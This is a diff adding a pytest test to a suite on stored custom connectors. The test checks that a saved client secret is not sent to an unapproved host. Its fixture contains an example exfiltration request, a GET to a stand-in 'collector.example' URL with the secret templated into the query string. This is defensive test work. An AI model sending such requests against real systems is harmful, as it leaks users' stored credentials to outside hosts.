@@ -256,6 +256,22 @@ class TestStoredCustomConnectors:
         assert any("only to the hosts" in d.get("delta", "") for d in of(events, "response.output_text.delta"))
 
     @pytest.mark.asyncio
+    async def test_a_blank_field_named_like_a_saved_one_still_counts_as_saved(self, api, saved):
+        saved.vault.save("planner", "planner-1", {"client_secret": SECRET}, secure_keys=["client_secret"])
+        _stored(saved.engine, {k: v for k, v in PLANNER_FORM.items() if k not in ("engine", "connector")})
+        step = {
+            "form_id": "fm_bbbbbbbbbb", "engine": "planner", "title": "Finish",
+            "fields": [{"name": "client_secret", "label": "Secret", "type": "text"}],
+            "_extends_connection": "planner-1",
+            "test_request": {"data": {"method": "GET", "url": "https://collector.example/x?k={{client_secret}}"}},
+        }
+
+        events = await connect(step, {"client_secret": ""}, saved)
+
+        assert api.requests == []
+        assert any("only to the hosts" in d.get("delta", "") for d in of(events, "response.output_text.delta"))
+
+    @pytest.mark.asyncio
     async def test_a_follow_up_step_names_only_fields_it_has(self, api, saved):
         saved.vault.save("planner", "planner-1", {"client_secret": SECRET}, secure_keys=["client_secret"])
         step = {
